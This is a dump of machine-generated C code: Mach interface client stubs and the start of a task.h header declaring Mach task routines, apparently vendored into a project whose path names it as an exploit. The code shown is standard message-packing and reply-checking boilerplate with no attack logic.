		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_behaviors, (const char *) Out2P->old_behaviors, 4 * Out0P->masksCnt);

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_flavors, (const char *) Out3P->old_flavors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_flavors, (const char *) Out3P->old_flavors, 4 * Out0P->masksCnt);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_test_sync_upcall_t__defined)
#define __MIG_check__Reply__task_test_sync_upcall_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_test_sync_upcall_t(__Reply__task_test_sync_upcall_t *Out0P)
{

	typedef __Reply__task_test_sync_upcall_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3561) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_test_sync_upcall_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_test_sync_upcall */
mig_external kern_return_t task_test_sync_upcall
(
	task_t task,
	mach_port_t port
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t port;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_test_sync_upcall_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_test_sync_upcall_t__defined */

	__DeclareSendRpc(3461, "task_test_sync_upcall")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->port = portTemplate;
	InP->port.name = port;
#else	/* UseStaticTemplates */
	InP->port.name = port;
	InP->port.disposition = 19;
	InP->port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3461;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3461, "task_test_sync_upcall")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3461, "task_test_sync_upcall")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_test_sync_upcall_t__defined)
	check_result = __MIG_check__Reply__task_test_sync_upcall_t((__Reply__task_test_sync_upcall_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_test_sync_upcall_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_corpse_forking_behavior_t__defined)
#define __MIG_check__Reply__task_set_corpse_forking_behavior_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_corpse_forking_behavior_t(__Reply__task_set_corpse_forking_behavior_t *Out0P)
{

	typedef __Reply__task_set_corpse_forking_behavior_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3562) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_corpse_forking_behavior_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_corpse_forking_behavior */
mig_external kern_return_t task_set_corpse_forking_behavior
(
	task_t task,
	task_corpse_forking_behavior_t behavior
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_corpse_forking_behavior_t behavior;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_set_corpse_forking_behavior_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_corpse_forking_behavior_t__defined */

	__DeclareSendRpc(3462, "task_set_corpse_forking_behavior")

	InP->NDR = NDR_record;

	InP->behavior = behavior;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3462;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3462, "task_set_corpse_forking_behavior")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3462, "task_set_corpse_forking_behavior")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_corpse_forking_behavior_t__defined)
	check_result = __MIG_check__Reply__task_set_corpse_forking_behavior_t((__Reply__task_set_corpse_forking_behavior_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_corpse_forking_behavior_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_test_async_upcall_propagation_t__defined)
#define __MIG_check__Reply__task_test_async_upcall_propagation_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_test_async_upcall_propagation_t(__Reply__task_test_async_upcall_propagation_t *Out0P)
{

	typedef __Reply__task_test_async_upcall_propagation_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3563) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_test_async_upcall_propagation_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_test_async_upcall_propagation */
mig_external kern_return_t task_test_async_upcall_propagation
(
	task_t task,
	mach_port_t port,
	int qos,
	int iotier
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int qos;
		int iotier;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_test_async_upcall_propagation_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_test_async_upcall_propagation_t__defined */

	__DeclareSendRpc(3463, "task_test_async_upcall_propagation")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->port = portTemplate;
	InP->port.name = port;
#else	/* UseStaticTemplates */
	InP->port.name = port;
	InP->port.disposition = 19;
	InP->port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->qos = qos;

	InP->iotier = iotier;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3463;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3463, "task_test_async_upcall_propagation")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3463, "task_test_async_upcall_propagation")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_test_async_upcall_propagation_t__defined)
	check_result = __MIG_check__Reply__task_test_async_upcall_propagation_t((__Reply__task_test_async_upcall_propagation_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_test_async_upcall_propagation_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_map_kcdata_object_64_t__defined)
#define __MIG_check__Reply__task_map_kcdata_object_64_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_map_kcdata_object_64_t(__Reply__task_map_kcdata_object_64_t *Out0P)
{

	typedef __Reply__task_map_kcdata_object_64_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3564) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_map_kcdata_object_64_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_map_kcdata_object_64 */
mig_external kern_return_t task_map_kcdata_object_64
(
	task_t task,
	kcdata_object_t kcdata_object,
	mach_vm_address_t *kcd_addr_begin,
	mach_vm_size_t *kcd_size
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t kcdata_object;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_vm_address_t kcd_addr_begin;
		mach_vm_size_t kcd_size;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_vm_address_t kcd_addr_begin;
		mach_vm_size_t kcd_size;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_map_kcdata_object_64_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_map_kcdata_object_64_t__defined */

	__DeclareSendRpc(3464, "task_map_kcdata_object_64")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t kcdata_objectTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->kcdata_object = kcdata_objectTemplate;
	InP->kcdata_object.name = kcdata_object;
#else	/* UseStaticTemplates */
	InP->kcdata_object.name = kcdata_object;
	InP->kcdata_object.disposition = 19;
	InP->kcdata_object.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3464;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3464, "task_map_kcdata_object_64")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3464, "task_map_kcdata_object_64")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_map_kcdata_object_64_t__defined)
	check_result = __MIG_check__Reply__task_map_kcdata_object_64_t((__Reply__task_map_kcdata_object_64_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_map_kcdata_object_64_t__defined) */

	*kcd_addr_begin = Out0P->kcd_addr_begin;

	*kcd_size = Out0P->kcd_size;

	return KERN_SUCCESS;
}

```

`Exploits/oobPCI/Sources/generated/task.h`:

```h
#ifndef	_task_user_
#define	_task_user_

/* Module task */

#include <string.h>
#include <mach/ndr.h>
#include <mach/boolean.h>
#include <mach/kern_return.h>
#include <mach/notify.h>
#include <mach/mach_types.h>
#include <mach/message.h>
#include <mach/mig_errors.h>
#include <mach/port.h>
	
/* BEGIN VOUCHER CODE */

#ifndef KERNEL
#if defined(__has_include)
#if __has_include(<mach/mig_voucher_support.h>)
#ifndef USING_VOUCHERS
#define USING_VOUCHERS
#endif
#ifndef __VOUCHER_FORWARD_TYPE_DECLS__
#define __VOUCHER_FORWARD_TYPE_DECLS__
#ifdef __cplusplus
extern "C" {
#endif
#ifndef __VOUCHER_FOWARD_TYPE_DECLS_SINGLE_ATTR
#define __VOUCHER_FOWARD_TYPE_DECLS_SINGLE_ATTR __unsafe_indexable
#endif
	extern boolean_t voucher_mach_msg_set(mach_msg_header_t * msg) __attribute__((weak_import));
#ifdef __cplusplus
}
#endif
#endif // __VOUCHER_FORWARD_TYPE_DECLS__
#endif // __has_include(<mach/mach_voucher_types.h>)
#endif // __has_include
#endif // !KERNEL
	
/* END VOUCHER CODE */

	
/* BEGIN MIG_STRNCPY_ZEROFILL CODE */

#if defined(__has_include)
#if __has_include(<mach/mig_strncpy_zerofill_support.h>)
#ifndef USING_MIG_STRNCPY_ZEROFILL
#define USING_MIG_STRNCPY_ZEROFILL
#endif
#ifndef __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__
#define __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__
#ifdef __cplusplus
extern "C" {
#endif
#ifndef __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS_CSTRING_ATTR
#define __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS_CSTRING_COUNTEDBY_ATTR(C) __unsafe_indexable
#endif
	extern int mig_strncpy_zerofill(char * dest, const char * src, int len) __attribute__((weak_import));
#ifdef __cplusplus
}
#endif
#endif /* __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__ */
#endif /* __has_include(<mach/mig_strncpy_zerofill_support.h>) */
#endif /* __has_include */
	
/* END MIG_STRNCPY_ZEROFILL CODE */


#ifdef AUTOTEST
#ifndef FUNCTION_PTR_T
#define FUNCTION_PTR_T
typedef void (*function_ptr_t)(mach_port_t, char *, mach_msg_type_number_t);
typedef struct {
        char            * name;
        function_ptr_t  function;
} function_table_entry;
typedef function_table_entry   *function_table_t;
#endif /* FUNCTION_PTR_T */
#endif /* AUTOTEST */

#ifndef	task_MSG_COUNT
#define	task_MSG_COUNT	65
#endif	/* task_MSG_COUNT */

#include <Availability.h>
#include <mach/std_types.h>
#include <mach/mig.h>
#include <mach/mig.h>
#include <mach/mach_types.h>
#include <mach_debug/mach_debug_types.h>

#ifdef __BeforeMigUserHeader
__BeforeMigUserHeader
#endif /* __BeforeMigUserHeader */

#include <sys/cdefs.h>
__BEGIN_DECLS


/* Routine task_create */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_create
(
	task_t target_task,
	ledger_array_t ledgers,
	mach_msg_type_number_t ledgersCnt,
	boolean_t inherit_memory,
	task_t *child_task
);

/* Routine task_terminate */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_terminate
(
	task_t target_task
);

/* Routine task_threads */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_threads
(
	task_inspect_t target_task,
	thread_act_array_t *act_list,
	mach_msg_type_number_t *act_listCnt
);

/* Routine mach_ports_register */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t mach_ports_register
(
	task_t target_task,
	mach_port_array_t init_port_set,
	mach_msg_type_number_t init_port_setCnt
);

/* Routine mach_ports_lookup */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t mach_ports_lookup
(
	task_t target_task,
	mach_port_array_t *init_port_set,
	mach_msg_type_number_t *init_port_setCnt
);

/* Routine task_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_info
(
	task_name_t target_task,
	task_flavor_t flavor,
	task_info_t task_info_out,
	mach_msg_type_number_t *task_info_outCnt
);

/* Routine task_set_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_info
(
	task_t target_task,
	task_flavor_t flavor,
	task_info_t task_info_in,
	mach_msg_type_number_t task_info_inCnt
);

/* Routine task_suspend */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_suspend
(
	task_read_t target_task
);

/* Routine task_resume */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_resume
(
	task_read_t target_task
);

/* Routine task_get_special_port */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_get_special_port
(
	task_inspect_t task,
	int which_port,
	mach_port_t *special_port
);

/* Routine task_set_special_port */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_special_port
(
	task_t task,
	int which_port,
	mach_port_t special_port
);

/* Routine thread_create */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_create
(
	task_t parent_task,
	thread_act_t *child_act
);

/* Routine thread_create_running */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t thread_create_running
(
	task_t parent_task,
	thread_state_flavor_t flavor,
	thread_state_t new_state,
	mach_msg_type_number_t new_stateCnt,
	thread_act_t *child_act
);

/* Routine task_set_exception_ports */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_exception_ports
(
	task_t task,
	exception_mask_t exception_mask,
	mach_port_t new_port,
	exception_behavior_t behavior,
	thread_state_flavor_t new_flavor
);

/* Routine task_get_exception_ports */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_get_exception_ports
(
	task_t task,
	exception_mask_t exception_mask,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_array_t old_handlers,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
);

/* Routine task_swap_exception_ports */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_swap_exception_ports
(
	task_t task,
	exception_mask_t exception_mask,
	mach_port_t new_port,
	exception_behavior_t behavior,
	thread_state_flavor_t new_flavor,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_array_t old_handlers,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
);

/* Routine lock_set_create */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t lock_set_create
(
	task_t task,
	lock_set_t *new_lock_set,
	int n_ulocks,
	int policy
);

/* Routine lock_set_destroy */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t lock_set_destroy
(
	task_t task,
	lock_set_t lock_set
);

/* Routine semaphore_create */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t semaphore_create
(
	task_t task,
	semaphore_t *semaphore,
	int policy,
	int value
);

/* Routine semaphore_destroy */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t semaphore_destroy
(
	task_t task,
	semaphore_t semaphore
);

/* Routine task_policy_set */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_policy_set
(
	task_policy_set_t task,
	task_policy_flavor_t flavor,
	task_policy_t policy_info,
	mach_msg_type_number_t policy_infoCnt
);

/* Routine task_policy_get */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_policy_get
(
	task_policy_get_t task,
	task_policy_flavor_t flavor,
	task_policy_t policy_info,
	mach_msg_type_number_t *policy_infoCnt,
	boolean_t *get_default
);

/* Routine task_sample */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_sample
(
	task_t task,
	mach_port_t reply
);

/* Routine task_policy */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_policy
(
	task_t task,
	policy_t policy,
	policy_base_t base,
	mach_msg_type_number_t baseCnt,
	boolean_t set_limit,
	boolean_t change
);

/* Routine task_set_emulation */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_emulation
(
	task_t target_port,
	vm_address_t routine_entry_pt,
	int routine_number
);

/* Routine task_get_emulation_vector */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_get_emulation_vector
(
	task_t task,
	int *vector_start,
	emulation_vector_t *emulation_vector,
	mach_msg_type_number_t *emulation_vectorCnt
);

/* Routine task_set_emulation_vector */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_emulation_vector
(
	task_t task,
	int vector_start,
	emulation_vector_t emulation_vector,
	mach_msg_type_number_t emulation_vectorCnt
);

/* Routine task_set_ras_pc */
#ifdef	mig_external
